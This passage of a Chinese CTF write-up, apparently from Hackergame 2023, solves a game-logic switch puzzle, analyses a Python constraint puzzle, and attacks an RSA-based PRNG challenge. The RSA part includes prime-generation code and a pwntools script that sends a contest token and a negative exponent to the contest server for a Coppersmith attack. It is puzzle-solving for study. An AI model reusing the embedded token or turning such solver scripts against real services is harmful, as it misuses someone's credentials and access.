class="line">sensor sw2 switch2 @enabled</span><br><span class="line">sensor sw3 switch3 @enabled</span><br><span class="line">sensor sw4 switch4 @enabled</span><br><span class="line">sensor sw5 switch5 @enabled</span><br><span class="line">sensor sw6 switch6 @enabled</span><br><span class="line">sensor sw7 switch7 @enabled</span><br><span class="line">sensor sw8 switch8 @enabled</span><br><span class="line">sensor sw9 switch9 @enabled</span><br><span class="line">control enabled conveyor2 sw1 0 0 0</span><br><span class="line">control enabled gate1 sw2 0 0 0</span><br><span class="line">op equal nsw3 sw3 0</span><br><span class="line">control enabled reactor1 nsw3 0 0 0</span><br><span class="line">control enabled reactor2 nsw3 0 0 0</span><br><span class="line">control enabled conduit1 sw4 0 0 0</span><br><span class="line">control enabled conduit2 sw4 0 0 0</span><br><span class="line">control enabled mixer1 sw5 0 0 0</span><br><span class="line">control enabled extractor1 sw6 0 0 0</span><br><span class="line">control enabled meltdown1 sw7 0 0 0</span><br><span class="line">control enabled meltdown2 sw7 0 0 0</span><br><span class="line">op equal result sw8 sw9</span><br><span class="line">jump 28 equal result true</span><br><span class="line">control enabled mixer1 0 0 0 0</span><br><span class="line">control enabled conduit2 1 0 0 0</span><br><span class="line">control enabled reactor1 1 0 0 0</span><br><span class="line">control enabled reactor2 1 0 0 0</span><br><span class="line">control enabled conveyor2 1 0 0 0</span><br><span class="line">wait 5</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>sw1为1，sw2为0，nsw3为1，则sw3为0</p><p>sw4为0，sw5wei1，sw6为1，sw7为1</p><p>Jump的条件需要满足，所以result为True，sw8为0</p><p>此时序列为<code>10001110</code></p><div class="note success flat"><p>正常工作！</p></div><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231103003014476.png" alt="image-20231103003014476"></p><h4 id="Part4"><a href="#Part4" class="headerlink" title="Part4"></a>Part4</h4><p>最后一部分则类似于一个迷宫，需要我们找到一个正确的电力传输路径</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231103004055387.png" alt="image-20231103004055387"></p><p>乍一看，我们能找到这题红色路径，接下来就是思考如何让路径上的节点工作</p><p>首先是switch3和4，他们置为1能让下图中框住的部分联通</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231103004245840.png" alt="image-20231103004245840"></p><p>接下来我们需要让下图中标红的线路工作</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231103005141437.png" alt="image-20231103005141437"></p><p>要想让红星的火力发电机工作，就需要<strong>关闭焚化炉3</strong></p><p>而焚化炉3被涡轮发动机控制，所以需要<strong>关闭涡轮发动机</strong>，此时控制两个煤炭能源旁的溢流门即可</p><p><strong>打开焚化炉2和4</strong>就能让涡轮发电机关闭，而这需要关闭焚化炉1</p><p>所以switch1为0，switch2为1</p><p>下面该思考如何连通下图的电路</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231103005559302.png" alt="image-20231103005559302"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231103010027107.png" alt="image-20231103010027107"></p><p>我们需要<strong>关闭焚化炉3</strong>，即切断其旁边电力节点的电源</p><p>这需要我们<strong>打开焚化炉1、2和4</strong>，即<strong>swtich6、7、8均为1</strong></p><p>此时开关序列为<code>01110111</code></p><div class="note success flat"><p>成功通电！</p></div><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231103010251178.png" alt="image-20231103010251178"></p><p>最终总的开关序列为<code>10100101110001001000110001110111</code></p><p>启动反应堆，并从提交网站获得flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231103010723295.png" alt="image-20231103010723295"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231103081137524.png" alt="image-20231103081137524"></p><h3 id="小Z的谜题"><a href="#小Z的谜题" class="headerlink" title="小Z的谜题"></a>小Z的谜题</h3><p>源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">bound = <span class="number">5</span></span><br><span class="line">constraints = ((<span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>), (<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>), (<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>), (<span class="number">1</span>, <span class="number">4</span>, <span class="number">4</span>), (<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>), (<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>))</span><br><span class="line">count = [<span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">num_constraints = <span class="built_in">sum</span>(count)</span><br><span class="line">num_dims = <span class="built_in">len</span>(constraints[<span class="number">0</span>])</span><br><span class="line">arrange = [[[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(num_dims)] <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(num_constraints)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Input a string:&#x27;</span>)</span><br><span class="line">s = (c <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">input</span>().strip())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_constraints):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(num_dims):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span> k == <span class="number">2</span>:</span><br><span class="line">                arrange[i][j][k] = -<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                number = <span class="built_in">int</span>(<span class="built_in">next</span>(s))</span><br><span class="line">                <span class="keyword">assert</span> <span class="number">0</span> &lt;= number &lt;= bound</span><br><span class="line">                arrange[i][j][k] = number</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Stage 0 passed&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> arrange == <span class="built_in">list</span>(<span class="built_in">sorted</span>(arrange))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Stage 1 passed&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_constraints):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(num_constraints):</span><br><span class="line">        <span class="keyword">if</span> i == j:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">any</span>((arrange[i][k][<span class="number">1</span>] &lt;= arrange[j][k][<span class="number">0</span>] <span class="keyword">or</span> arrange[j][k][<span class="number">1</span>] &lt;= arrange[i][k][<span class="number">0</span>]) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(num_dims))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Stage 2 passed&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_constraints):</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(constraints)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">tuple</span>(<span class="built_in">sorted</span>([arrange[i][j][<span class="number">1</span>] - arrange[i][j][<span class="number">0</span>] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(num_dims)])) == constraints[t]:</span><br><span class="line">            count[t] -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">assert</span> <span class="keyword">not</span> <span class="built_in">any</span>(count)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Stage 3 passed&#x27;</span>)</span><br><span class="line">score = <span class="built_in">len</span>(<span class="built_in">set</span>((x, y, z) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_constraints) <span class="keyword">for</span> x, y, z <span class="keyword">in</span> itertools.product(*arrange[i])))</span><br><span class="line"><span class="keyword">if</span> score &gt;= <span class="number">157</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&#x27;/flag3&#x27;</span>).read())</span><br><span class="line"><span class="keyword">elif</span> score &lt;= <span class="number">136</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&#x27;/flag2&#x27;</span>).read())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&#x27;/flag1&#x27;</span>).read())</span><br></pre></td></tr></table></figure><p>为了更好地做题，我们需要深入理解这个程序</p><p><code>bound</code>限制了我们输入的每个字符的范围为<strong>数字0到5</strong></p><p>arrange数字的维度为(num_constraints,num_dims,3)</p><p>该数组用于将<strong>用户的输入字符串存为特定格式</strong>，存入的总元素数量为144</p><p>由于当<code>k == 2</code>，则<code>arrange[i][j][k] = -1</code>，所以用户输入长度其实只有总容量的三分之二，即96个字符</p><p>接下来会遇到第一个判断语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">assert</span> arrange == <span class="built_in">list</span>(<span class="built_in">sorted</span>(arrange))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Stage 1 passed&#x27;</span>)</span><br></pre></td></tr></table></figure><p>要想知道这句代码的规则，需要先了解<code>sorted()</code>函数</p><div class="note info flat"><p><strong>sorted()</strong> 函数用于对所有可迭代的对象进行排序操作。</p><p> 语法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sorted</span>(iterable, cmp=<span class="literal">None</span>, key=<span class="literal">None</span>, reverse=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li>iterable — 可迭代对象。</li><li>cmp — 比较的函数，这个具有两个参数，参数的值都是从可迭代对象中取出，此函数必须遵守的规则为，大于则返回1，小于则返回-1，等于则返回0。</li><li>key — 主要是用来进行比较的元素，只有一个参数，具体的函数的参数就是取自于可迭代对象中，指定可迭代对象中的一个元素来进行排序。</li><li>reverse — 排序规则，reverse = True 降序 ， reverse = False 升序（默认）。</li></ul></div><div class="note warning flat"><p>sorted只支持相同元素之间进行比较，例如int和int，list和list，元组和元组，<strong>如果可迭代对象中存在不同类型的元素，则会发生报错</strong></p><p>当sorted传入的可迭代对象中的<strong>元素为列表时</strong>，则会取列表的第一个元素与可迭代对象的下一个元素进行比较，若相同，则会取该列表的下一个元素，以此类推</p><p>示例如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">arrange = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>]]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">sorted</span>(arrange)))</span><br><span class="line"><span class="comment"># [[0, 1, 2], [1, 2, 3]]</span></span><br><span class="line">arrange = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>],[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">sorted</span>(arrange)))</span><br><span class="line"><span class="comment"># [[1, 2, 3], [1, 2, 4]]</span></span><br><span class="line">arrange = [[<span class="number">1</span>,[<span class="number">2</span>,<span class="number">3</span>],<span class="number">4</span>],[<span class="number">1</span>,[<span class="number">2</span>,<span class="number">2</span>],<span class="number">4</span>]]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">sorted</span>(arrange)))</span><br><span class="line"><span class="comment"># [[1, [2, 2], 4], [1, [2, 3], 4]]</span></span><br></pre></td></tr></table></figure></div><p>sorted的判断使得输入的字符串<code>arrang[i][0]</code>序列需要<strong>整体满足升序</strong></p><p>接下来是第二个判断条件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_constraints):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(num_constraints):</span><br><span class="line">        <span class="keyword">if</span> i == j:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">any</span>((arrange[i][k][<span class="number">1</span>] &lt;= arrange[j][k][<span class="number">0</span>] <span class="keyword">or</span> arrange[j][k][<span class="number">1</span>] &lt;= arrange[i][k][<span class="number">0</span>]) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(num_dims))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Stage 2 passed&#x27;</span>)</span><br></pre></td></tr></table></figure><div class="note info flat"><p>在 Python 中，<code>any()</code> 是一个内置函数，用于检查可迭代对象中是否至少有一个元素为真。如果是，则返回 <code>True</code>，否则返回 <code>False</code>。</p></div><p>第三个判断条件如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_constraints):</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(constraints)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">tuple</span>(<span class="built_in">sorted</span>([arrange[i][j][<span class="number">1</span>] - arrange[i][j][<span class="number">0</span>] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(num_dims)])) == constraints[t]:</span><br><span class="line">            count[t] -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">assert</span> <span class="keyword">not</span> <span class="built_in">any</span>(count)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Stage 3 passed&#x27;</span>)</span><br></pre></td></tr></table></figure><p>前面设置的所有限制都需要得到满足</p><p>第二个条件和第三个条件的共同作用导致，<code>arrange[i][j]</code>和<code>arrange[i][j+n]</code>不能完全相同</p><p>得分机制如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">score = <span class="built_in">len</span>(<span class="built_in">set</span>((x, y, z) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_constraints) <span class="keyword">for</span> x, y, z <span class="keyword">in</span> itertools.product(*arrange[i])))</span><br><span class="line"><span class="keyword">if</span> score &gt;= <span class="number">157</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&#x27;/flag3&#x27;</span>).read())</span><br><span class="line"><span class="keyword">elif</span> score &lt;= <span class="number">136</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&#x27;/flag2&#x27;</span>).read())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&#x27;/flag1&#x27;</span>).read())</span><br></pre></td></tr></table></figure><p><code>score</code>与前面最小列表的种类个数有关</p><h3 id="黑客马拉松"><a href="#黑客马拉松" class="headerlink" title="黑客马拉松"></a>黑客马拉松</h3><p>本题源码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> isprime</span><br><span class="line"></span><br><span class="line"><span class="comment"># You do know that we SCGY students can factor RSA, right?</span></span><br><span class="line"><span class="comment"># So just give me p and q directly</span></span><br><span class="line">p = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;p: &#x27;</span>))</span><br><span class="line">q = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;q: &#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span> isprime(p) <span class="keyword">and</span> isprime(q) <span class="keyword">and</span> p != q</span><br><span class="line"></span><br><span class="line"><span class="comment"># Prove me that p, q are strong primes</span></span><br><span class="line">lfp = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;A large prime factor of p-1: &#x27;</span>))</span><br><span class="line">lfq = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;A large prime factor of q-1: &#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span> isprime(lfp) <span class="keyword">and</span> isprime(lfq)</span><br><span class="line"><span class="keyword">assert</span> (p-<span class="number">1</span>) % lfp == <span class="number">0</span> <span class="keyword">and</span> (q-<span class="number">1</span>) % lfq == <span class="number">0</span></span><br><span class="line"><span class="keyword">assert</span> lfp &gt; <span class="number">2</span>**<span class="number">128</span> <span class="keyword">and</span> lfq &gt; <span class="number">2</span>**<span class="number">128</span></span><br><span class="line"></span><br><span class="line">N = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">Nbits = N.bit_length()</span><br><span class="line"><span class="comment"># N is large enough</span></span><br><span class="line"><span class="keyword">assert</span> Nbits == <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">e = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;e: &#x27;</span>)) % phi</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line"><span class="comment"># No Low Private Exponent Attack</span></span><br><span class="line"><span class="keyword">assert</span> d.bit_length() &gt; <span class="number">0.292</span>*Nbits</span><br><span class="line"><span class="comment"># No Low Public Exponent Attack</span></span><br><span class="line">k = Nbits - <span class="built_in">max</span>(<span class="built_in">int</span>(Nbits*<span class="number">2</span>/e), <span class="number">96</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># OK, we&#x27;ve got a safe RSA parameters</span></span><br><span class="line">state = random.SystemRandom().randint(<span class="number">2</span>, N-<span class="number">1</span>)</span><br><span class="line">randomNums = []</span><br><span class="line">states = []</span><br><span class="line"></span><br><span class="line">mission = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Choose mission: &quot;</span>))</span><br><span class="line"><span class="keyword">if</span> mission == <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        state = <span class="built_in">pow</span>(state, e, N)</span><br><span class="line">        randomNums.append(<span class="built_in">int</span>(state) &amp; ((<span class="number">1</span> &lt;&lt; k) - <span class="number">1</span>))</span><br><span class="line">        states.append(state)</span><br><span class="line"><span class="keyword">elif</span> mission == <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">        state = state &gt;&gt; k</span><br><span class="line">        state = <span class="built_in">pow</span>(state, e, N)</span><br><span class="line">        randomNums.append(<span class="built_in">int</span>(state) &amp; ((<span class="number">1</span> &lt;&lt; k) - <span class="number">1</span>))</span><br><span class="line">        states.append(state)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Not a small loop</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(states)-<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">assert</span> (math.gcd(states[i] - state, N) == <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(randomNums)</span><br><span class="line">guess = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Predict PRNG state: &quot;</span>))</span><br><span class="line"><span class="keyword">if</span> guess == state:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">f&quot;/flag<span class="subst">&#123;mission&#125;</span>&quot;</span>).read())</span><br></pre></td></tr></table></figure><h4 id="教练，有人抢跑！"><a href="#教练，有人抢跑！" class="headerlink" title="教练，有人抢跑！"></a>教练，有人抢跑！</h4><p>题目需要我们生成满足条件的随机数</p><p>见多了各种chall.py中如何生成RSA公钥的我们可以很容易地写出如下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> isprime</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_p</span>(<span class="params">lfp</span>):</span><br><span class="line">   p=<span class="number">1</span></span><br><span class="line">   <span class="keyword">while</span>(p.bit_length()!=<span class="number">512</span> <span class="keyword">or</span> isprime(p)==<span class="number">0</span>):</span><br><span class="line">      p = lfp*<span class="number">2</span>*getPrime(<span class="number">512</span>-lfp.bit_length()-<span class="number">1</span>)+<span class="number">1</span></span><br><span class="line">   <span class="keyword">return</span> p</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pq</span>():</span><br><span class="line">   N=<span class="number">1</span></span><br><span class="line">   <span class="keyword">while</span>(N.bit_length()!=<span class="number">1024</span>):</span><br><span class="line">      lfp = getPrime(<span class="number">129</span>)</span><br><span class="line">      p = get_p(lfp)</span><br><span class="line">      lfq = getPrime(<span class="number">129</span>)</span><br><span class="line">      q = get_p(lfq)</span><br><span class="line">      N = p*q</span><br><span class="line">   <span class="keyword">return</span> lfp,p,lfq,q</span><br><span class="line">lfp,p,lfq,q =get_pq()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p:&quot;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q:&quot;</span>,q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;lfp:&quot;</span>,lfp)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;lfq:&quot;</span>,lfq)</span><br></pre></td></tr></table></figure><p>生成固定的p、q参数后，我们来考虑e</p><p>本题能得到<strong>明密文的后k位</strong>，考虑<strong>coppersmith攻击</strong></p><p>那么此时e不能太大，但是k的大小又和e有关，e越小k越小</p><p>但是这只是考虑了e为正数的情况，如果e为负数，那么k就恒为96</p><p>终端交互脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = <span class="number">8130783200765099079371905805653275305530953408368486972439144538377172762778724178293921761601331901642956558545531112904308756365058449689105893951902947</span></span><br><span class="line">q = <span class="number">11454088000212950190744304417071055599116596384509623856814663255888235693331192150623151438185124694138841377055326544017433007065922209282946188611202987</span></span><br><span class="line">lfp = <span class="number">556695256623252691766599489994025390137</span></span><br><span class="line">lfq = <span class="number">625845849695411279745162870674729131439</span></span><br><span class="line">n = p*q</span><br><span class="line">e = -<span class="number">3</span></span><br><span class="line">token = <span class="string">&#x27;123:MEQCIDydESRkW/h1aEuArWNCcOUqHC9UX9BmL0xBqZzaXnceAiAzrt9aK/g2oMXhW2iP+ON7DcClF3xMmhyzuN+w4qV2Xw==&#x27;</span></span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">&#x27;202.38.93.111&#x27;</span>, <span class="number">20230</span>)</span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;your token:&#x27;</span>)</span><br><span class="line">conn.sendline(token.encode())</span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;p: &#x27;</span>)</span><br><span class="line">conn.sendline(<span class="built_in">str</span>(p).encode())</span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;q: &#x27;</span>)</span><br><span class="line">conn.sendline(<span class="built_in">str</span>(q).encode())</span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;p-1: &#x27;</span>)</span><br><span class="line">conn.sendline(<span class="built_in">str</span>(lfp).encode())</span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;q-1: &#x27;</span>)</span><br><span class="line">conn.sendline(<span class="built_in">str</span>(lfq).encode())</span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;e: &#x27;</span>)</span><br><span class="line">conn.sendline(<span class="built_in">str</span>(e).encode())</span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;mission: &#x27;</span>)</span><br><span class="line">conn.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">states = <span class="built_in">eval</span>(conn.recvuntil(<span class="string">b&#x27;state: &#x27;</span>)[:-<span class="number">21</span>])</span><br><span class="line">mbar = states[-<span class="number">2</span>]</span><br><span class="line">cbar = states[-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(mbar)</span><br><span class="line"><span class="built_in">print</span>(cbar)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><p>编写sage脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 